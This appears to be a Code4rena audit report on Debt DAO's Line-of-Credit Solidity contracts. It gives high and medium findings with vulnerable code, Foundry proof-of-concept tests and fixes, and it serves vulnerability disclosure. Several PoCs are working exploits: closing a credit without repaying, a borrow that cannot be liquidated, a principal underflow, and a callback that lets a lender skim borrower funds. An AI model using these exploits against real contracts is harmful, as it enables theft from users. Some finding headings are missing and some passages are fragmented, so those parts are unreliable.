# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Debt DAO smart contract system written in Solidity. The audit contest took place between November 3â€”November 10 2022.

## [[H-01] Call to `declareInsolvent()` would revert when contract status reaches liquidation point after repayment of credit position 1](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)
*Submitted by [cryptphi](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69), also found by [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/329), [Ch\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/316), [PaludoX0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/211), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/166), and [perseverancesuccess](https://github.com/code-423n4/2022-11-debtdao-findings/issues/150)*

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86>

### Impact

The modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits\[ids].

Assume, when borrower chooses lender positions including credits\[ids\[0]] to draw on, and repays back the loan fully for credits\[ids\[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids\[1] to ids\[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.

### Proof of Concept

1.  LineOfCredit contract is set up and 5 lenders have deposited into the contract.
2.  Alice, the borrower borrows credit from these 5 credit positions including by calling `LineOfCredit.borrow()` for the position ids.
3.  Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated.
4.  At the point where `ids.stepQ()` is called in `\_repay()`, position 1 is moved to ids\[0]
5.  When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`

### Recommended Mitigation Steps

The modifier `whileBorrowing()` would need to be reviewed and amended.

## [[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119)
*Submitted by [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/462), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/317), and [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/70)*

Neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`:

```solidity
       if(self.settings[revenueContract].claimFunction == bytes4(0)) {
            // push payments

            // claimed = total balance - already accounted for balance
            claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens
            // underflow revert ensures we have more tokens than we started with and actually claimed revenue
        }
```

`SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts:

```solidity
uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;
```

Therefore, the whole `claimed` amount is sent to the treasury.

This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.

### Proof Of Concept

As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff:

```diff
--- a/contracts/tests/Spigot.t.sol
+++ b/contracts/tests/Spigot.t.sol
@@ -174,7 +174,7 @@ contract SpigotTest is Test {
         assertEq(token.balanceOf(address(spigot)), totalRevenue);
         
         bytes memory claimData;
-        spigot.claimRevenue(revenueContract, address(token), claimData);
+        spigot.claimRevenue(address(0), address(token), claimData);
```

Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.

### Recommended Mitigation Steps

Check that a revenue contract was registered before, revert if it does not.

## [[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)
*Submitted by [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/471), [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/430), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/351), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/325), and [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/42)*

<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234>

### Impact

The functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:

```solidity
modifier mutualConsent(address _signerOne, address _signerTwo) {
      if(_mutualConsent(_signerOne, _signerTwo))  {
        // Run whatever code needed 2/2 consent
        _;
      }
}

function _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {
        if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }

        address nonCaller = _getNonCaller(_signerOne, _signerTwo);

        // The consent hash is defined by the hash of the transaction call data and sender of msg,
        // which uniquely identifies the function, arguments, and sender.
        bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));

        if (!mutualConsents[expectedHash]) {
            bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));

            mutualConsents[newHash] = true;

            emit MutualConsentRegistered(newHash);

            return false;
        }

        delete mutualConsents[expectedHash];

        return true;
}
```

The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.

This is very problematic in combination with sending ETH for two reasons:
1. When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.
2. Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.

### Proof Of Concept

Lender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.

### Recommended Mitigation Steps

Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.

## [[H-04] Borrower can close a credit without repaying debt](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258)
*Submitted by [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258), also found by [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/527), [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/472), [smiling\_heretic](https://github.com/code-423n4/2022-11-debtdao-findings/issues/394), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/334), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/298), and [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/272)*

A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.

### Proof of Concept

The `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID:
[LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388):

```solidity
function close(bytes32 id) external payable override returns (bool) {
    Credit memory credit = credits[id];
    address b = borrower; // gas savings
    if(msg.sender != credit.lender && msg.sender != b) {
      revert CallerAccessDenied();
    }

    // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off
    credit = _accrue(credit, id);
    uint256 facilityFee = credit.interestAccrued;
    if(facilityFee > 0) {
      // only allow repaying interest since they are skipping repayment queue.
      // If principal still owed, _close() MUST fail
      LineLib.receiveTokenOrETH(credit.token, b, facilityFee);

      credit = _repay(credit, id, facilityFee);
    }

    _close(credit, id); // deleted; no need to save to storage

    return true;
}
```

[LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483):

```solidity
function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }

    // return the Lender's funds that are being repaid
    if (credit.deposit + credit.interestRepaid > 0) {
        LineLib.sendOutTokenOrETH(
            credit.token,
            credit.lender,
            credit.deposit + credit.interestRepaid
        );
    }

    delete credits[id]; // gas refunds

    // remove from active list
    ids.removePosition(id);
    unchecked { --count; }

    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.
    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }

    emit CloseCreditPosition(id);

    return true;
}
```

Proof of Concept:

```solidity
// contracts/tests/LineOfCredit.t.sol
function testCloseWithoutRepaying_AUDIT() public {
    assertEq(supportedToken1.balanceOf(address(line)), 0, "Line balance should be 0");
    assertEq(supportedToken1.balanceOf(lender), mintAmount, "Lender should have initial mint balance");
      
    _addCredit(address(supportedToken1), 1 ether);

    bytes32 id = line.ids(0);
    assert(id != bytes32(0));

    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, "Lender should have initial balance less lent amount");
    
    hoax(borrower);
    line.borrow(id, 1 ether);
    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, "Borrower should have initial balance + loan");
    
    // The credit hasn't been repaid.
    // hoax(borrower);
    // line.depositAndRepay(1 ether);
    
    hoax(borrower);
    // Closing with a non-existent credit ID.
    line.close(bytes32(uint256(31337)));

    // The debt hasn't been repaid but the status is REPAID.
    assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));

    // Lender's balance is still reduced by the borrow amount.
    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);

    // Borrower's balance still includes the borrowed amount.
    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether);
}
```

### Recommended Mitigation Steps

In the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.

## [[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. ](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421)
*Submitted by [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421), also found by [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/281)*

LineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\[0], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\[0] before other credit lines. 

The list is managed by several functions:

1.  CreditListLib.removePosition - deletes parameter id in the ids array
2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element
3.  \_sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:
    1.  target index is not empty
    2.  there is no principal owed for the target index's credit

The idea I had is that if we could corrupt the ids array so that ids\[0] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. 

    modifier whileBorrowing() {
        if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }
        _;
    }

It turns out there is a simple sequence of calls which allows borrowing while ids\[0] is deleted, and does not re-arrange the new borrow into ids\[0]!

1.  id1 = `addCredit()` - add a new credit line, a new id is pushed to the end of ids array.
2.  id2 = `addCredit()` - called again, ids.length = 2
3.  close(id1) - calls `removePosition()` on id1, now ids array is \[0x000000000000000000000000, id2 ]
4.  borrow(id2) - will borrow from id2 and call `\_sortIntoQ`. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).

From this sequence, we achieve a borrow while ids\[0] is 0! Therefore, credits\[ids\[0]].principal = credits\[0].principal = 0, and whileBorrowing() reverts.

The impact is massive - the following functions are disabled:

*   `SecureLine::liquidate()`
*   `LineOfCredit::depositAndClose()`
*   `LineOfCredit::depositAndRepay()`
*   `LineOfCredit::claimAndRepay()`
*   `LineOfCredit::claimAndTrade()`

### Impact

Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.

### Proof of Concept

Copy the following code into LineOfCredit.t.sol

    function _addCreditLender2(address token, uint256 amount) public {
        // Prepare lender 2 operations, does same as mintAndApprove()
        address lender2 = address(21);
        deal(lender2, mintAmount);
        supportedToken1.mint(lender2, mintAmount);
        supportedToken2.mint(lender2, mintAmount);
        unsupportedToken.mint(lender2, mintAmount);
        vm.startPrank(lender2);
        supportedToken1.approve(address(line), MAX_INT);
        supportedToken2.approve(address(line), MAX_INT);
        unsupportedToken.approve(address(line), MAX_INT);
        vm.stopPrank();
        // addCredit logic
        vm.prank(borrower);
        line.addCredit(dRate, fRate, amount, token, lender2);
        vm.stopPrank();
        vm.prank(lender2);
        line.addCredit(dRate, fRate, amount, token, lender2);
        vm.stopPrank();
    }
    function test_attackUnliquidatable() public {
        bytes32 id_1;
        bytes32 id_2;
        _addCredit(address(supportedToken1), 1 ether);
        _addCreditLender2(address(supportedToken1), 1 ether);
        id_1 =  line.ids(0);
        id_2 =  line.ids(1);
        hoax(borrower);
        line.close(id_1);
        hoax(borrower);
        line.borrow(id_2, 1 ether);
        id_1 =  line.ids(0);
        id_2 = line.ids(1);
        console.log("id1 : ", uint256(id_1));
        console.log("id2 : ", uint256(id_2));
        vm.warp(ttl+1);
        assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);
        vm.expectRevert(ILineOfCredit.NotBorrowing.selector);
        bool isSolvent = line.declareInsolvent();
    }

### Recommended Mitigation Steps

When sorting new borrows into the ids queue, do not skip any elements.

## [[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461)
*Submitted by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461), also found by [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/418), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/414), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/336), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/210), [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/93), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/82)*

A borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.

This a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.

Additionally, a lender can do the same thing as the lender can call this function.

### Impact

The `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 1` will make it hugely expensive to repay the credit line.

### Proof of Concept

[utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)

```solidity
function repay(
  ILineOfCredit.Credit memory credit,
  bytes32 id,
  uint256 amount
)
  external
  returns (ILineOfCredit.Credit memory)
{ unchecked {
    if (amount <= credit.interestAccrued) {
        credit.interestAccrued -= amount;
        credit.interestRepaid += amount;
        emit RepayInterest(id, amount);
        return credit;
    } else {
        uint256 interest = credit.interestAccrued;
        uint256 principalPayment = amount - interest;

        // update individual credit line denominated in token
        credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block
        credit.interestRepaid += interest;
        credit.interestAccrued = 0;

        emit RepayInterest(id, interest);
        emit RepayPrincipal(id, principalPayment);

        return credit;
    }
} }
```

To demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test "test_lender_use_and_repay_underflow"`.

Following scenario causes the repayment to underflow:

1.  Borrower borrows `1 ether` of `revenueToken`
2.  `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract
3.  Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`)
4.  `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`

```solidity
function test_lender_use_and_repay_underflow() public {
    uint256 largeRevenueAmount = lentAmount * 2;

    deal(address(lender), lentAmount + 1 ether);
    deal(address(revenueToken), MAX_REVENUE);
    address revenueC = address(0xbeef); // need new spigot for testing
    bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);

    // 1. Borrow lentAmount = 1 ether
    _borrow(id, lentAmount);

    // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)
    bytes memory tradeData = abi.encodeWithSignature(
      'trade(address,address,uint256,uint256)',
      address(revenueToken),
      Denominations.ETH,
      1 gwei,
      largeRevenueAmount
    );

    hoax(borrower);
    line.claimAndTrade(address(revenueToken), tradeData);

    (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));
    assertEq(principalBeforeRepaying, lentAmount);

    // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)
    vm.prank(lender);
    line.useAndRepay(largeRevenueAmount);
    (, uint256 _principal,,,,,) = line.credits(line.ids(0));

    uint256 underflowedPrincipal = principalBeforeRepaying;

    unchecked {
      underflowedPrincipal -= (largeRevenueAmount);
    }

    // 4. Principal underflowed
    assertEq(_principal, underflowedPrincipal);
  }
```

### Recommended Mitigation Steps

Consider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326)

# Medium Risk Findings (11)
## [[M-01] Borrower can by mistake add own money to credit if credit is in ETH](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)*

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244>

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>

### Impact

Borrower can mistakenly add own money to credit if credit is in ETH.

### Proof of Concept

Function `LineOfCredit.addCredit` is used to create new credit.

It can be called only after contest of another party.

```solidity
    function addCredit(
        uint128 drate,
        uint128 frate,
        uint256 amount,
        address token,
        address lender
    )
        external
        payable
        override
        whileActive
        mutualConsent(lender, borrower)
        returns (bytes32)
    {
        LineLib.receiveTokenOrETH(token, lender, amount);


        bytes32 id = _createCredit(lender, token, amount);


        require(interestRate.setRate(id, drate, frate));
        
        return id;
    }
```

`LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment.

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>

```solidity
    function receiveTokenOrETH(
      address token,
      address sender,
      uint256 amount
    )
      external
      returns (bool)
    {
        if(token == address(0)) { revert TransferFailed(); }
        if(token != Denominations.ETH) { // ERC20
            IERC20(token).safeTransferFrom(sender, address(this), amount);
        } else { // ETH
            if(msg.value < amount) { revert TransferFailed(); }
        }
        return true;
    }
```

As you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can mistakenly pay instead of lender. It sounds funny, but it's possible. What is needed is for the lender to call `addCredit` first and then borrower calls `addCredit` and provides value.

### Tools Used

VSCode

### Recommended Mitigation Steps

Check that if payment in ETH, then `lender == msg.sender` in `addCredit` function.

## [[M-02] Mutual consent cannot be revoked and stays valid forever](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33)
*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33), also found by [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/526), [SmartSek](https://github.com/code-423n4/2022-11-debtdao-findings/issues/503), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/299), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/271), [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/61), and [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/38)*

<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262>

### Impact

Contracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.

Functions that use this modifier need consent from two parties to be called successfully.

Once one party has given consent for a function call, it cannot revoke consent.

This means that the other party can call this function at any time now.

This opens the door for several exploitation paths.

Most notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.

One party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.

### Proof of Concept

1.  A borrower and lender want to change the rates for a credit.
    The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.
2.  The borrower and lender agree to set `dRate` and `fRate` to 5%.
3.  The lender calls the `LineOfCredit.setRates()` function to give his consent.
4.  The borrower might now say to the lender "Let's put the rate to 5.1% instead, I will give an extra 0.1%"
5.  The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%.
6.  The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules) and at some point the borrower can decide to set the rates to 5%.

### Tools Used

VSCode

### Recommended Mitigation Steps

There are several options to fix this issue:

1.  Add a function to the `MutualConsent` contract to revoke consent for a function call.
2.  Make consent valid only for a certain amount of time.
3.  Invalidate existing consents for a function when function is called with different arguments.

Option 3 requires a lot of additional bookkeeping but is probably the cleanest solution.

### Impact

The protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting. As a result, the funds are permanently locked in the protocol **(Loss of funds)**.

There are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.

The vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).

This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine.

### Proof of Concept

The bug resides in `receiveTokenOrETH` function when receiving ETH.

The function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.

<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59>

      function receiveTokenOrETH(
          address token,
          address sender,
          uint256 amount
        )
          external
          returns (bool)
        {
            if(token == address(0)) { revert TransferFailed(); }
            if(token != Denominations.ETH) { // ERC20
                IERC20(token).safeTransferFrom(sender, address(this), amount);
            } else { // ETH
                if(msg.value < amount) { revert TransferFailed(); }
            }
            return true;
        }

Scenarios where borrowers ETH funds will be locked in LineOfCredit:

1.  Borrower calls `depositAndClose` with an ETH value that is above the owed debt.
2.  Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters.
3.  Borrower calls `close` with an ETH value that is above the owed fees.

Scenarios where lenders ETH funds will be locked in LineOfCredit:

1.  Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter.
2.  Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.

The above scenarios will happen when:

*   Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake.
*   Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.
    *   The formula that calculates interest:

`InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR + 
(rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR`<br>
Where `timespan` is `timespan= block.timestamp - rate.lastAccrued`<br>
    *   Attached link to Debt DAO docs with more information: <https://docs.debtdao.finance/faq/accrued-interest-calculation>

The POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output:

The POC demonstrates how Borrower and Lender funds get locked in the protocol.

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

Options:

1.  refund - in receiveTokenOrETH, refund tokens back to ` msg.sender  `if `msg.value > amount`
2.  revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction.

### Impact

Lender can trade claimToken in a malicious way to steal the borrower's money via `claimAndRepay()` in SpigotedLine by using malicious zeroExTradeData.

In the design of the protocol, the lender can use the function `claimAndRepay()`, the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.

```
function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external
        whileBorrowing
        nonReentrant
        returns (uint256) { 

...
// Line 106 - Line 112
uint256 newTokens = claimToken == credit.token ?
          spigot.claimEscrow(claimToken) :  // same asset. dont trade
          _claimAndTrade(                   // trade revenue token for debt obligation
              claimToken,
              credit.token,
              zeroExTradeData
          );
...
// Line 128 - Line 130 
 credits[id] = _repay(credit, id, repaid);

        emit RevenuePayment(claimToken, repaid);

...

}

```

    function _claimAndTrade(
          address claimToken,
          address targetToken,
          bytes calldata zeroExTradeData
        )
            internal
            returns (uint256)
        {
            (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(
                claimToken,
                targetToken,
                swapTarget,
                address(spigot),
                unusedTokens[claimToken],
                zeroExTradeData
            );

            // we dont use revenue after this so can store now
            unusedTokens[claimToken] = totalUnused;
            return tokensBought;
        }

```
function claimAndTrade(
        address claimToken,
        address targetToken,
        address payable swapTarget,
        address spigot,
        uint256 unused,
        bytes calldata zeroExTradeData
    )
    external 
        returns(uint256, uint256)

{
...
 trade(
            claimed + unused,
            claimToken,
            swapTarget,
            zeroExTradeData
        );
        
        // underflow revert ensures we have more tokens than we started with
        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;

        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought
...


}

```

In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.

The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.

### Proof of Concept

The following code can manipulate and bypass the check to steal money of the borrower.

Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.

Step 2: In the exploit contract, have the `receive()` function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.

```
receive() external payable {
    console.log("Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance");
    uint256 amount = 100; 
    creditToken.transfer(address(line),amount);
    console.log("Receive the amount of ETH: %s", msg.value);
  }

```

In the `receive()` function, the exploit contract transfers some amount of creditToken to the SpigotedLine contract to bypass the check:

     if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought

Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.

This amount then will be used to repay the credit.

So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.

In the zip file in the Google_Drive link, there is the POC written for this bug.

The test case is test_lender_can_claim_and_repay\_3 in file SpigotedLine.t.modified.sol

You can put this file to the tests folder
<https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing>

    umber 15918000

Here I use the block-number to make the test log stable, but this does not impact the logic of POC.

You can find the detailed log file: Line-of-Credit\test_claim\_221107\_2311.log.

The full log file here: <https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing>

In this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 &ast; ( 10 &ast;&ast; -18 ) BUSD for the borrower.

Logs:

Step 0: As a Borrower borrow some money

Step 1: Construct the tradeData to call claimAndRepay as the lender

unused: 0

sellAmount: 1000000000000000000000

### Tools Used

### Recommended Mitigation Steps

This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.

It's likely that the vector in #411 is more likely to occur, but I'm marking this one the best due to the inclusion of a test and descriptive POC. For the final report it should be noted that both the lender and borrower can perform a version of this attack.

## [[M-05] Reentrancy bug allows lender to steal other lenders funds](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160)
